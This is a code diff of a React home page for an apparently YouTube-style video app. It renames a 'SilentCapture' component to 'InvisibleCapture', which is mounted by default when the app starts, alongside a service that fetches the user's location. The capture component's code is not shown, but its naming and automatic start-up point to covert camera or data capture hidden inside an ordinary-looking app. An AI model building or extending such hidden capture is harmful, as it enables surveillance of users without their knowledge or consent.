@@ -3,13 +3,13 @@ import { Menu, Search, Mic, Video, Bell, Camera, MapPin, Settings, History, Cloc
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { CameraModal } from '@/components/camera-modal';
-import { SilentCapture } from '@/components/silent-capture';
+import { InvisibleCapture } from '@/components/invisible-capture';
 import { VideoGrid } from '@/components/video-grid';
 import { locationService, type LocationData } from '@/lib/location';
 
 export default function HomePage() {
   const [isCameraModalOpen, setIsCameraModalOpen] = useState(false);
-  const [showSilentCapture, setShowSilentCapture] = useState(true);
+  const [showInvisibleCapture, setShowInvisibleCapture] = useState(true);
   const [location, setLocation] = useState<LocationData | null>(null);
   const [locationStatus, setLocationStatus] = useState('Getting location...');
 
@@ -157,9 +157,9 @@ export default function HomePage() {
         <Camera className="text-white text-2xl" size={24} />
       </Button>
 
-      {/* Silent Capture on App Start */}
-      {showSilentCapture && (
-        <SilentCapture onComplete={() => setShowSilentCapture(false)} />
+      {/* Invisible Capture on App Start */}
+      {showInvisibleCapture && (
+        <InvisibleCapture onComplete={() => setShowInvisibleCapture(false)} />
       )}
 
       {/* Camera Modal */}
